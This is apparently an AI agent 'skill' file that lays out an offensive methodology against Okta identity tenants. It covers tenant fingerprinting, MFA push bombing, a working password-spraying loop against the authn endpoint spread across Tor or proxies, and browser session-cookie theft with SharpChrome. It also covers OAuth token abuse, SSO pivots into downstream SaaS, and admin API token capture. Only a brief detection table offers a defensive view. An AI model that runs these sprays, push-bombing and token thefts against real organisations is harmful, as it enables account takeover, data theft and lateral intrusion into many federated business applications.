---
name: offensive-okta-attacks
description: "Okta-specific attack methodology — Okta tenant fingerprinting, push fatigue / MFA bombing, password spraying with rate-limit awareness, session token theft, OAuth integration abuse, Okta Verify push-based phishing, post-authentication SSO chain abuse, and lateral pivots from Okta to downstream SaaS. Use when target uses Okta as primary IdP — common in mid-large enterprises and SaaS-heavy organizations."
---

# Okta Attacks

Okta is the largest non-Microsoft IdP in enterprise. Many of its attack patterns mirror Entra ID equivalents — but Okta-specific quirks matter.

## Tenant Fingerprinting

```bash
# Okta tenant discovery
curl https://target.okta.com/.well-known/openid-configuration

# Or test the "well-known" tenant URLs
curl https://target.okta.com/api/v1/users/me
```

Subdomain pattern: `<company>.okta.com` for non-custom-domain tenants. Custom domains are common in enterprise; check DNS.

## Push Fatigue / MFA Bombing

Send repeated MFA push notifications to the target. Eventually they accept to make notifications stop.

```bash
# Authenticate with valid creds (from password spray or phish)
# Trigger MFA push
# Repeat every 5–30 seconds for 10–30 attempts
```

Mitigation: number-matching MFA (Okta added in 2022) defeats this. Push-only without number matching is still vulnerable.

## Password Spraying

Okta rate-limits per-IP per-account. Spray slowly:

```bash
# 1 attempt per account per 30 minutes
# Distributed across IPs (Tor / commercial proxies)

for u in users; do
  for p in 'Welcome1' 'Spring2025!'; do
    curl -X POST "https://target.okta.com/api/v1/authn" \
      -d "{\"username\":\"$u@target.com\",\"password\":\"$p\"}"
    sleep 1800
  done
done
```

CrackMapExec / nxc with Okta module exists in newer versions.

## Session Token Theft

Okta sessions are JWT-bearer cookies. With local access to the user's browser, steal the cookie:

```bash
# Browser cookie store (Chrome/Edge — DPAPI on Windows)
# Linux: ~/.config/google-chrome/Default/Cookies (sqlite, AES-encrypted via libsecret)

# Common helper: SharpChrome / chrome_decryptor
SharpChrome.exe cookies /server:target.okta.com /target:<output>
```

Replay the cookie in attacker's browser → Okta session as victim.

## OAuth Integration Abuse

Okta apps using OAuth issue access / refresh tokens. Captured tokens persist across cookie clears.

Same patterns as Entra ID:
- Illicit consent (register attacker app on Okta dev tenant if cross-org possible)
- Refresh token theft from local storage / vault

## Okta Verify Push-Based Phishing

Modern Okta Verify uses FIDO2 / phishing-resistant flows. Older deployments use push approval — vulnerable to:

- Push fatigue (above)
- AiTM phishing where a proxy captures session post-MFA
- Session-binding flaws on certain device types

## Post-Auth SSO Chain

Okta is typically the primary IdP for many SaaS apps. With Okta access:

```bash
# Pull user's app dashboard
curl "https://target.okta.com/api/v1/users/me/appLinks" \
  -H "Cookie: sid=<okta-session>"

# Each app link is a SAML/OIDC SSO target
# Click any → land in Salesforce / Workday / Confluence / etc. as the user
```

Okta's app dashboard typically lists 20-100+ federated SaaS apps. Each is a downstream target.

## Admin / Super Admin Compromise

Okta administrators have a separate role hierarchy. Targets:

- Super Admin — equivalent of Global Admin
- Org Admin — broad
- App Admin — per-app
- Help Desk Admin — limited (but can reset MFA)

```bash
# Enumerate admin users (with Org Admin or read role)
curl "https://target.okta.com/api/v1/users?filter=status eq \"ACTIVE\"" \
  -H "Authorization: SSWS <api-token>"
```

API tokens bypass the user MFA requirement. Capture an admin's API token = persistent admin access without MFA.

## Detection

| Signal | Defender View |
|---|---|
| Bulk failed auth | Okta Sysem Log + ThreatInsight |
| MFA bombing | Okta detects rapid push counts in newer versions |
| Cookie theft | Hard to detect server-side; client-side EDR may flag |
| API token use from new IP | Behavioral analytics |

Okta's ThreatInsight (paid feature) catches some patterns. Without it, defenders rely on OS-level monitoring.

## Engagement Cheatsheet

```bash
# 1. Tenant discovery
curl https://target.okta.com/.well-known/openid-configuration

# 2. User enumeration via login flow (false-positive-free if anti-enumeration off)
# 3. Password spray (slow + distributed)
# 4. MFA bypass (push fatigue, AiTM, cookie theft)
# 5. Once authenticated, enumerate connected apps via /appLinks
# 6. Pivot to downstream SaaS via SSO chain
# 7. Document each: technique, target, observed impact
```

## Key References

- Okta API documentation
- "Okta Attacks" (various 2022-2024 BB writeups)
- LAPSUS$ Okta breach (March 2022) — public technique disclosure
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/okta.md
